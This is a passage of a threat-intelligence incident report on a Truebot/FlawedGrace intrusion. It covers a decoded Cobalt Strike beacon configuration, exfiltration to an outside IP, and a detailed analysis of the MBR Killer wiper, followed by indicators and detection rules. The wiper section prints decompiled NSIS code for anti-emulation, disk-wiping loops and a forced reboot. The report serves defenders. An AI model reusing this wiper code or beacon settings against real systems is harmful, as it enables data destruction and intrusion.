<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-040-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-19071" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-040-1.png" alt width="2256" height="573" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-040-1.png 2256w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-040-1-300x76.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-040-1-1024x260.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-040-1-768x195.png 768w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-040-1-1536x390.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-040-1-2048x520.png 2048w" sizes="(max-width: 2256px) 100vw, 2256px" /></a></figure>
<p>&nbsp;</p>


<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>IP</td>
<td>Port</td>
<td>JA3</td>
<td>JA3s</td>
</tr>
<tr>
<td>5.188.206[.]78</td>
<td>443</td>
<td>72a589da586844d7f0818ce684948eea</td>
<td>f176ba63b4d68e576b5ba345bec2c7b7</td>
</tr>
</tbody>
</table>
</figure>


<pre class="wp-block-preformatted">Certificate: [6e:ce:5e:ce:41:92:68:3d:2d:84:e2:5b:0b:a7:e0:4f:9c:b7:eb:7c]
Not Before: 2015/05/20 18:26:24 UTC 
Not After: 2025/05/17 18:26:24 UTC
Issuer Org: 
Subject Common: 
Subject Org: 
Public Algorithm: rsaEncryption
</pre>


<p>Cobalt Strike beacon configuration:</p>


<pre class="wp-block-preformatted">{
  "beacontype": [
    "HTTPS"
  ],
  "sleeptime": 60000,
  "jitter": 0,
  "maxgetsize": 16777216,
  "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==",
  "license_id": 1580103824,
  "cfg_caution": false,
  "kill_date": null,
  "server": {
    "hostname": "5.188.206.78",
    "port": 443,
    "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCpq+thntRoA67IEQOJ9T8JfpepBXCrOX43GMXPArNSegjOtHm8eQ7971m0anDglcLtW/9qf38KJfsVGPYW60xHzoKm/K2gr+zgNEUL8sxHErfehglDZexWDY6/Gl+sbM8i5RhN6cT1e7PSr36q9U9a3gCVukKeto0KxG5L0rhDOQIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="           
  },                                                                                                                                                                                       
  "host_header": "",                                                                                                                                                                       
  "useragent_header": null,                                                                                                                                                                
  "http-get": {                                                                                                                                                                            
    "uri": "/ga.js",                                                                                                                                                                       
    "verb": "GET",                                                                                                                                                                         
    "client": {                                                                                                                                                                            
      "headers": null,                                                                                                                                                                     
      "metadata": null                                                                                                                                                                     
    },                                                                                                                                                                                     
    "server": {
      "output": [
        "print"
      ]
    }
  },
  "http-post": {
    "uri": "/submit.php",
    "verb": "POST",
    "client": {
      "headers": null,
      "id": null,
      "output": null
    }
  },
  "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",                                                                                                                                                                                 
  "crypto_scheme": 0,
  "proxy": {
    "type": null,
    "username": null,
    "password": null,
    "behavior": "Use IE settings"
  },
  "http_post_chunk": 0,
  "uses_cookies": true,
  "post-ex": {
    "spawnto_x86": "%windir%\\syswow64\\rundll32.exe",
    "spawnto_x64": "%windir%\\sysnative\\rundll32.exe"
  },
  "process-inject": {
    "allocator": "VirtualAllocEx",
    "execute": [
      "CreateThread",
      "SetThreadContext",
      "CreateRemoteThread",
      "RtlCreateUserThread"
    ],
    "min_alloc": 0,
    "startrwx": true,
    "stub": "ezN0tALmJbn0hY8yMkftaA==",
    "transform-x86": null,
    "transform-x64": null,
    "userwx": true
  },
  "dns-beacon": {
    "dns_idle": null,
    "dns_sleep": null,
    "maxdns": null,
    "beacon": null,
    "get_A": null,
    "get_AAAA": null,
    "get_TXT": null,
    "put_metadata": null,
    "put_output": null
  },
  "pipename": null,
  "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",                                                                                                                                                                                 
  "stage": {
    "cleanup": false
  },
  "ssh": {
    "hostname": null,
    "port": null,
    "username": null,
    "password": null,
    "privatekey": null
  }
}
</pre>


<h2 id="exfiltration" class="wp-block-heading"><a href="#exfiltration">Exfiltration</a></h2>


<p>On the second day of the intrusion, a connection from a file server began to the IP 139.60.160[.]166 over port 4433. The process tree indicates the FlawedGrace malware injected into svchost and msiexec on the file server and initiated the transfer. <a href="https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/" target="_blank" rel="noreferrer noopener">Other reports</a> have indicated Truebot/FlawedGrace intrusions have deployed custom tools for exfiltration. We did not observe any additional binary dropped to disk to perform the exfiltration. As the FlawedGrace process established the TCP connection, we assess with moderate confidence the capability was included in the FlawedGrace malware itself.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-041.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-19000" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-041.png" alt width="1435" height="163" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-041.png 1435w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-041-300x34.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-041-1024x116.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-041-768x87.png 768w" sizes="(max-width: 1435px) 100vw, 1435px" /></a></figure>


<p>Two distinct exfiltration periods were observed taking place around two hours apart.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-042.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-19001" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-042.png" alt width="2341" height="558" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-042.png 2341w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-042-300x72.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-042-1024x244.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-042-768x183.png 768w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-042-1536x366.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-042-2048x488.png 2048w" sizes="(max-width: 2341px) 100vw, 2341px" /></a></figure>


<p>The network traffic was not sent over a TLS connection but just the TCP protocol.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-043.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-19002" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-043.png" alt width="1015" height="543" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-043.png 1015w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-043-300x160.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-043-768x411.png 768w" sizes="(max-width: 1015px) 100vw, 1015px" /></a></figure>


<p>This data was not observable in plain text, indicating likely other obfuscation/encryption methods in use. Using flow data between the two sessions, we were able to verify gigabytes of data were exfiltrated.</p>


<h2 id="impact" class="wp-block-heading"><a href="#impact">Impact</a></h2>


<p>Within four hours of the completed exfiltration, merely 29 hours after initial execution, the threat actors started deploying MBR Killer (aka KillDisk), well-known for its <a href="https://flashpoint.io/blog/banco-de-chile-mbr-killler-reveals-hidden-nexus-buhtrap/" target="_blank" rel="noreferrer noopener">usage during the 2016 Banco de Chile attack</a>. As documented by Flashpoint, the wiper is an NSIS (Nullsoft Scriptable Install System) script capable of wiping a device&#8217;s MBR (Master Boot Record), MFT (Master File Table), VBR (Volume Boot Record) and EBR (Extended Boot Record) before forcing a reboot to render a device inoperable. During this destructive stage, the threat actors named the file C:\ProgramData\chrome.exe on the beachhead, while on other servers the C:\Windows\Temp\[0-9a-f]{32}.exe naming pattern was used.</p>


<p>As a defense-evasion technique, MBR Killer has been observed using patched NSIS installers relying on non-standard headers. Once the payload signature is corrected, NSIS decompilers such as <a href="https://sourceforge.net/projects/sevenzip/files/7-Zip/15.05/" target="_blank" rel="noreferrer noopener">7zip (</a><a href="https://sourceforge.net/projects/sevenzip/files/7-Zip/15.05/" target="_blank" rel="noreferrer noopener">9.34 &#8211; 15.05</a><a href="https://sourceforge.net/projects/sevenzip/files/7-Zip/15.05/" target="_blank" rel="noreferrer noopener">)</a> are able to extract the malicious NSIS script.</p>


<figure class="wp-block-table">
<table style="height: 221px;" width="638">
<tbody>
<tr>
<td><strong><em>Origin</em></strong></td>
<td><strong><em>Hexadecimal Signature</em></strong></td>
</tr>
<tr>
<td><a href="https://nsis.sourceforge.io/Can_I_decompile_an_existing_installer" target="_blank" rel="noreferrer noopener">NSIS Specification</a></td>
<td>EF BE AD DE 4E 75 6C 6C 73 6F 66 74 49 6E 73 74</td>
</tr>
<tr>
<td>The DFIR Report&#8217;s MBR Killer</td>
<td>EF BE AD DE 4E 75 6C 6C 73 6F 66 74 49 <strong>90 </strong>73 74</td>
</tr>
<tr>
<td>Banco de Chile&#8217;s MBR Killer</td>
<td>EF BE AD DE 4E 75 6C 6C 73 6F 66 74 49 6E 73 <strong>85</strong></td>
</tr>
</tbody>
</table>
</figure>


<p>This customization provides defenders with a detection opportunity as outlined within the hereafter-provided YARA rules.</p>


<p>During initialization, MBR Killer visually hides itself by moving off-screen.</p>


<pre class="wp-block-preformatted">Function .onGUIInit
  System::Call "User32::SetWindowPos(i, i, i, i, i, i, i) i ($HWNDPARENT, 0, -10000, -10000, 0, 0, 0x0200|0x0001)"
FunctionEnd
</pre>


<p>Once hidden, the malicious installer verifies whether it is being emulated by temporarily patching the native Windows ZwClose function (part of ntdll.dll) to immediately succeed with STATUS_SUCCESS before closing a dummy handle through kernel32::CloseHandle(0x12345678) and validating that, although the handle was invalid, the CloseHandle method succeeded.</p>


<pre class="wp-block-preformatted">System::Call "kernel32::GetModuleHandle(t) p ('ntdll.dll') .r0"
IntCmp $0 0 label_exit
System::Call "kernel32::GetProcAddress(p, t) p (r0, 'ZwClose') .r1"
IntCmp $1 0 label_exit
System::Call "kernel32::VirtualProtect(p, i, i, *i) i (r1, 6, 0x40, .r2) .r0"
IntCmp $0 0 label_exit
System::Alloc 6
Pop $3
System::Call "ntdll::memcpy(p, p ,i) i (r3, r1, 6)"
System::Call "ntdll::memcpy(p, t, i) i (r1, t '1ÀYZÿá', 6)"
System::Call "kernel32::CloseHandle(i) i (0x12345678) .r4"
System::Call "ntdll::memcpy(p, p, i) i (r1, r3, 6)"
IntCmp $4 1 0 label_exit label_exit
</pre>


<p>If the anti-analysis check succeeds, the script issues the HideWindow NSIS call, which <a href="https://nsis.sourceforge.io/Reference/HideWindow" target="_blank" rel="noreferrer noopener">hides the installer</a> and proceeds to validate the existence of the first physical drive \\.\PHYSICALDRIVE0 by opening it.</p>


<pre class="wp-block-preformatted">Function func_open_physicaldrive
  IntFmt $1 \\.\PHYSICALDRIVE%d $0
  Push $0
  StrCpy $0 $1
  System::Call "Kernel32::CreateFile(t, i, i, i, i, i, i) i ('$0', 0x80000000|0x40000000, 0x1|0x2, 0, 3, 0x80, 0) .r2"
  Pop $0
FunctionEnd
</pre>


<p>Once the first \\.\PHYSICALDRIVE0 drive opened, MBR Killer conditionally attempts to wipe:</p>


<ul>
<li>MFT (Master File Table) contains metadata about files and directories, such as names, dates and sizes.</li>


<li>VBR (Volume Boot Record) contains, amongst others, code required to bootstrap the operating system.</li>


<li>EBR (Extended Boot Record) contains information to describe logical partitions.</li>
</ul>


<p>MBR Killer then proceeds to wipe the MBR (Master Boot Record) three times by writing 512 empty bytes at offset 0 and attempts to repeat the wiping on the next available disk (\\.\PHYSICALDRIVE1, \\.\PHYSICALDRIVE2, &#8230;).</p>


<pre class="wp-block-preformatted">label_check_physicaldrive:
  Call func_open_physicaldrive
  IntCmp $2 -1 label_goto_exit
  System::Call "kernel32::SetFilePointer(i, i ,i ,i) i (r2, 0, 0, 0) .r3"
  IntCmp $3 -1 label_close_physicaldrive
  System::Alloc 4
  Pop $3
  System::Call "kernel32::ReadFile(i, i, i, p, i) i (r2, r9, 512, r3, 0) .r4"
  System::Free $3
  IntCmp $4 1 0 label_close_physicaldrive label_close_physicaldrive
  Push $0
  Push $2
  Push $9
  Push $2
  Push $9
  Call func_wipe_mft_vbr__ebr
  Pop $9
  Pop $2
  Pop $0
  System::Alloc 512
  Pop $5
  System::Alloc 4
  Pop $6
  StrCpy $7 1
  Goto label_wipe
label_next_wipe:
  IntOp $7 $7 + 1
label_wipe:
  IntCmp $7 3 0 0 label_free_wipe
  System::Call "kernel32::SetFilePointer(i, i ,i ,i) i (r2, 0, 0, 0) .r3"
  IntCmp $3 -1 label_goto_next_wipe
  System::Call "kernel32::WriteFile(i, i, i, p, i) i (r2, r5, 512, r6, 0)"
  System::Call "kernel32::FlushFileBuffers(i) i (r2)"
label_goto_next_wipe:
  Goto label_next_wipe
label_free_wipe:
  System::Free $6
  System::Free $5
label_close_physicaldrive:
  System::Call "kernel32::CloseHandle(i) i (r2)"
  Goto label_next_physicaldrive
label_goto_exit:
  Goto label_exit
label_next_physicaldrive:
  IntOp $0 $0 + 1
  Goto label_check_physicaldrive
</pre>


<p>Once the MBR Killer wiper has done its damage, the script attempts to modify its process privileges to enable the SeShutdownPrivilege and initiates a reboot.</p>


<pre class="wp-block-preformatted">label_exit:
  StrCpy $1 0
  System::Call "advapi32::OpenProcessToken(i, i, *i) i (-1, 0x0008|0x0020, .r1) i .r0"
  StrCmp $0 0 label_shutdown
  System::Call "advapi32::LookupPrivilegeValue(t, t, *l) i (n, 'SeShutdownPrivilege', .r2r2) i .r0"
  StrCmp $0 0 label_close_process
  System::Call "*(i 1, l r2, i 0x00000002) i .r0"
  System::Call "advapi32::AdjustTokenPrivileges(i, i, i, i, i, i) i (r1, 0, r0, 0, 0, 0)"
  System::Free $0
label_close_process:
  System::Call "kernel32::CloseHandle(i) i (r1)"
label_shutdown:
  Call func_shutdown
</pre>


<p>To initiate the reboot, MBR Killer calls ExitWindowsEx with:</p>


<ul>
<li>EWX_REBOOT (0x2) to cause a reboot</li>


<li>EWX_FORCE (0x4) to try to force the operation</li>


<li>SHTDN_REASON_MAJOR_SOFTWARE (0x00030000) to indicate it was software-caused</li>


<li>SHTDN_REASON_MINOR_UPGRADE (0x00000003) to indicate the software reason is an upgrade.</li>
</ul>


<pre class="wp-block-preformatted">Function func_shutdown
  Push $1
  StrCpy $1 0x2|0x4
  System::Call "user32::ExitWindowsEx(i, i) i ($1, 0x00030000|0x00000003) i .r0"
  Pop $1
FunctionEnd
</pre>


<p>Worth noting is that even-though the MBR Killer script attempts a reboot, the same functionality is implemented within the NSIS installer itself. Upon reboot, the affected machines were rendered inoperable.</p>


<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-044.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-19003" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-044.png" alt width="532" height="131" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-044.png 532w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-044-300x74.png 300w" sizes="(max-width: 532px) 100vw, 532px" /></a></figure>


<p>While the wiper we observed was not packed using VM-Protect, the decompiled script is near-similar to the <a href="https://www.virustotal.com/gui/file/1a09b182c63207aa6988b064ec0ee811c173724c33cf6dfe36437427a5c23446/detection" target="_blank" rel="noreferrer noopener">2016 Banco de Chile wiper component</a> and indicates the source-code was likely shared.</p>


<p>Supporting this theory was the change in NSIS version from v3.0b2 (Released on August 4th, 2015) to v3.04 (Released on December 15th, 2018) alongside the removal of the MBR Killer branding.</p>


<pre class="wp-block-preformatted">-Name "MBR Killer"
-BrandingText "Nullsoft Install System v3.0b2"
+Name Name
+BrandingText "Nullsoft Install System v3.04"
</pre>


<p>While the 2016 sample was <a href="https://en.wikipedia.org/wiki/Bzip2" target="_blank" rel="noreferrer noopener">bzip2</a>-compressed, the recompiled version now uses the more performant <a href="https://en.wikipedia.org/wiki/Zlib" target="_blank" rel="noreferrer noopener">zlib</a> compression.</p>


<pre class="wp-block-preformatted">-SetCompressor /SOLID bzip2
+SetCompressor zlib
</pre>


<p>Functionality-wise, our newly observed wiper performs a justified reboot (0x2, EWX_REBOOT) whereas the Banco de Chile variant merely performed an unjustified shut-down (0x8, EWX_POWEROFF).</p>


<pre class="wp-block-preformatted">-  StrCpy $1 0x8|0x4
-  System::Call "user32::ExitWindowsEx(i, i) i ($1, 0) i .r0"
+  StrCpy $1 0x2|0x4
+  System::Call "user32::ExitWindowsEx(i, i) i ($1, 0x00030000|0x00000003) i .r0"
</pre>


<p>As a hunting opportunity, we observed NSIS executables (legitimate or not) automatically drop the %Temp%\ns[a-zA-Z0-9]{5}.tmp\System.dll library as part of the <a href="https://nsis.sourceforge.io/Docs/System/System.html" target="_blank" rel="noreferrer noopener">legitimate NSIS System plugin</a>, giving developers the ability to call any exported function from any DLL. While not indicative of malicious activity, we recommend threat hunters review the creation of the above library to identify potentially undesirable installers within their environment.</p>


<h2 id="timeline" class="wp-block-heading"><a href="#timeline">Timeline</a></h2>
<h2>

</h2>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-046-2.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-19101" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-046-2.png" alt width="2644" height="2755" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-046-2.png 2644w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-046-2-288x300.png 288w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-046-2-983x1024.png 983w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-046-2-768x800.png 768w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-046-2-1474x1536.png 1474w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-046-2-1965x2048.png 1965w" sizes="(max-width: 2644px) 100vw, 2644px" /></a></figure>
<p>&nbsp;</p>
<h2 id="diamond-model" class="wp-block-heading"><a href="#diamond-model">Diamond Model</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-048-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-19088" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-048-1.png" alt width="2788" height="1320" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-048-1.png 2788w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-048-1-300x142.png 300w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-048-1-1024x485.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-048-1-768x364.png 768w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-048-1-1536x727.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-048-1-2048x970.png 2048w" sizes="(max-width: 2788px) 100vw, 2788px" /></a></p>


<figure class="wp-block-image"></figure>


<h2 id="iocs" class="wp-block-heading"><a href="#iocs">Indicators</a></h2>


<h3 class="wp-block-heading">Atomic</h3>


<pre class="wp-block-preformatted"># Truebot
essadonio[.]com / 45.182.189[.]71

# Cobalt Strike
5.188.206[.]78

# FlawedGrace
5.188.86[.]18
81.19.135[.]30
92.118.36[.]199

# Exfiltration IP Address
139.60.160[.]166
</pre>


<h3 class="wp-block-heading">Computed</h3>


<pre class="wp-block-preformatted"># Truebot 
Name: Document_may_24_16654.exe
Size: 10435552 bytes
MD5: 6164e9d297d29aa8682971259da06848
SHA1: 96b95edc1a917912a3181d5105fd5bfad1344de0
SHA256: 717beedcd2431785a0f59d194e47970e9544fbf398d462a305f6ad9a1b1100cb

# Truebot C2
IP: 45.182.189[.]71
JARM: 28d28d28d00028d00042d42d0000005a3e96c1dfa4bdb24b8b3c04cae18cc3

# AdFind
Name: AdFind.exe
Size: 1619968 bytes
MD5: 12011c44955fd6631113f68a99447515
SHA1: 4f4f8cf0f9b47d0ad95d159201fe7e72fbc8448d
SHA256: c92c158d7c37fea795114fa6491fe5f145ad2f8c08776b18ae79db811e8e36a3

# MBR Killer
Name: chrome.exe
Size: 46698
MD5: 2dc57a3836e4393d4d16c4eb04bf9c7e
SHA1: c6a5b345cef4eb795866ba81dcac9bd933fdd86d
SHA256: 121a1f64fff22c4bfcef3f11a23956ed403cdeb9bdb803f9c42763087bd6d94e

# Legitimate NSIS System plugin
Name: System.dll
MD5: fbe295e5a1acfbd0a6271898f885fe6a
SHA1: d6d205922e61635472efb13c2bb92c9ac6cb96da
SHA256: a1390a78533c47e55cc364e97af431117126d04a7faed49390210ea3e89dd0e1
</pre>



<h2 id class="wp-block-heading"><a href="#detections">Detections</a></h2>


<h3 class="wp-block-heading">Network</h3>
<p><a href="https://github.com/The-DFIR-Report/Suricata-Rules/blob/main/rules/truebot.rules">https://github.com/The-DFIR-Report/Suricata-Rules/blob/main/rules/truebot.rules</a></p>


<pre class="wp-block-preformatted">ETPRO MALWARE FlawedGrace CnC Activity M1
ETPRO MALWARE FlawedGrace CnC Activity M2
ET DROP Dshield Block Listed Source group 1
ET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike
ET MALWARE Meterpreter or Other Reverse Shell SSL Cert
ThreatFox Cobalt Strike botnet C2 traffic (ip:port - confidence level: 100%)
ThreatFox Silence botnet C2 traffic (ip:port - confidence level: 75%)
ET POLICY Tunneled RDP msts Handshake
ET POLICY SMB2 NT Create AndX Request For an Executable File
ET POLICY SMB Executable File Transfer
ET RPC DCERPC SVCCTL - Remote Service Control Manager Access
</pre>



<h3 class="wp-block-heading">Sigma</h3>



<p><a href="https://github.com/The-DFIR-Report/Sigma-Rules" target="_blank" rel="noreferrer noopener">DFIR Report Repository</a></p>
<p>Nullsoft Scriptable Installer Script (NSIS) execution: b95288d8-020a-4df0-95cb-d2d3a806ab11</p>
<p>Nullsoft Scriptable Installer Script (NSIS) execution: 221f15de-1cce-40b2-a766-2873938198c6</p>
<p>Viewing remote directories: bca1fab7-5640-489d-a161-e154fb6ba4f8</p>
<p>List remote processes using tasklist: 80a56507-6778-4d04-8346-320a70358f2c</p>
<p>FlawedGrace spawning threat injection target: 295e71e5-38c9-4a59-90dd-9fa7bf617b4b</p>


<p>AdFind Discovery: 50046619-1037-49d7-91aa-54fc92923604</p>


<p><a href="https://github.com/SigmaHQ/sigma" target="_blank" rel="noreferrer noopener">Sigma Repository</a></p>


<p>CobaltStrike Named Pipe: d5601f8c-b26f-4ab0-9035-69e11a8d4ad2</p>


<p>CobaltStrike Service Installations &#8211; Security: d7a95147-145f-4678-b85d-d1ff4a3bb3f6</p>


<p>Suspicious Group And Account Reconnaissance Activity Using Net.EXE: d95de845-b83c-4a9a-8a6a-4fc802ebf6c0</p>


<p>Net.exe Execution: 183e7ea8-ac4b-4c23-9aec-b3dac4e401ac</p>


<p>New Process Created Via Wmic.EXE: 526be59f-a573-4eea-b5f7-f0973207634d</p>


<p>Suspicious Scheduled Task Creation: 3a734d25-df5c-4b99-8034-af1ddb5883a4</p>


<p>New User Created Via Net.EXE: cd219ff3-fa99-45d4-8380-a7d15116c6dc</p>


<h3 class="wp-block-heading">Yara</h3>
<p><a href="https://github.com/The-DFIR-Report/Yara-Rules/blob/main/21619/21619.yar">https://github.com/The-DFIR-Report/Yara-Rules/blob/main/21619/21619.yar</a></p>



<h2 id="mitre" class="wp-block-heading"><a href="#mitre">MITRE</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/06/21619-047-2.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-19121" src="https://thedfirreport.com/wp-content/uploads/2023/06/21619-047-2.png" alt width="1690" height="1908" srcset="https://thedfirreport.com/wp-content/uploads/2023/06/21619-047-2.png 1690w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-047-2-266x300.png 266w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-047-2-907x1024.png 907w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-047-2-768x867.png 768w, https://thedfirreport.com/wp-content/uploads/2023/06/21619-047-2-1361x1536.png 1361w" sizes="(max-width: 1690px) 100vw, 1690px" /></a></p>


<pre class="wp-block-preformatted">Process Injection - T1055
Disk Structure Wipe - T1561.002
Exfiltration Over Alternative Protocol - T1048
Match Legitimate Name or Location - T1036.005
Disable or Modify Tools - T1562.001
Deobfuscate/Decode Files or Information - T1140
Fileless Storage - T1027.011
Command Obfuscation - T1027.010
Scheduled Task - T1053.005
PowerShell - T1059.001
Malicious File - T1204.002
Web Protocols - T1071.001
Custom Command and Control Protocol - T1094
System Owner/User Discovery - T1033
Domain Groups - T1069.002
Local Groups - T1069.001
Domain Trust Discovery - T1482
Process Discovery - T1057
Domain Account - T1087.002
File and Directory Discovery - T1083
Remote System Discovery - T1018
Security Software Discovery - T1518.001
Query Registry - T1012
SMB/Windows Admin Shares - T1021.002
Local Data Staging - T1074.001
LSASS Memory - T1003.001
Pass the Hash - T1550.002
Valid Accounts - T1078
Create or Modify System Process: Windows Service - T1543.003<br/>OS Credential Dumping: Security Account Manager - T1003.002<br/>Spearphishing Link - T1566.002<br/><span id="subtechnique-parent-name"></span></pre>


<p>Internal case #21619</p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-18950" class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/?share=twitter" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-18950" class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/?share=linkedin" target="_blank" title="Click to share on LinkedIn"><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/?share=reddit" target="_blank" title="Click to share on Reddit"><span>Reddit</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-18950" class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/?share=facebook" target="_blank" title="Click to share on Facebook"><span>Facebook</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared class="share-jetpack-whatsapp sd-button share-icon" href="https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/?share=jetpack-whatsapp" target="_blank" title="Click to share on WhatsApp"><span>WhatsApp</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id="jp-relatedposts" class="jp-relatedposts">
<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>
</div>
<footer class="entry-footer">
<div class="entry-meta">
</div>
</footer>
</div>
</article>
<nav class="navigation post-navigation" aria-label="Posts">
<h2 class="screen-reader-text">Post navigation</h2>
<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/" rel="prev">IcedID Macro Ends in Nokoyawa Ransomware</a></div><div class="nav-next"><a href="https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/" rel="next">HTML Smuggling Leads to Domain Wide Ransomware</a></div></div>
</nav>
</main>
</div>
<aside id="secondary" class="widget-area">
<section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
<label>
<span class="screen-reader-text">Search for:</span>
<input type="search" class="search-field" placeholder="Search &hellip;" value name="s" />
</label>
<input type="submit" class="search-submit" value="Search" />
</form></section><section id="google_translate_widget-5" class="widget widget_google_translate_widget"><div id="google_translate_element"></div></section><section id="block-7" class="widget widget_block"> <div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
<form action="https://wordpress.com/email-subscriptions" method="post" accept-charset="utf-8" data-blog="175340963" data-post_access_level="everybody" data-subscriber_email id="subscribe-blog">
<div class="wp-block-jetpack-subscriptions__form-elements">
<p id="subscribe-email">
<label id="subscribe-field-label" for="subscribe-field" class="screen-reader-text">
Type your email… </label>
<input required="required" type="email" name="email" class="no-border-radius " style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;" placeholder="Type your email…" value id="subscribe-field" title="Please fill in this field." /> </p>
<p id="subscribe-submit">
<input type="hidden" name="action" value="subscribe" />
<input type="hidden" name="blog_id" value="175340963" />
<input type="hidden" name="source" value="https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/" />
<input type="hidden" name="sub-type" value="subscribe-block" />
<input type="hidden" name="app_source" value />
<input type="hidden" name="redirect_fragment" value="subscribe-blog" />
<input type="hidden" name="lang" value="en_US" />
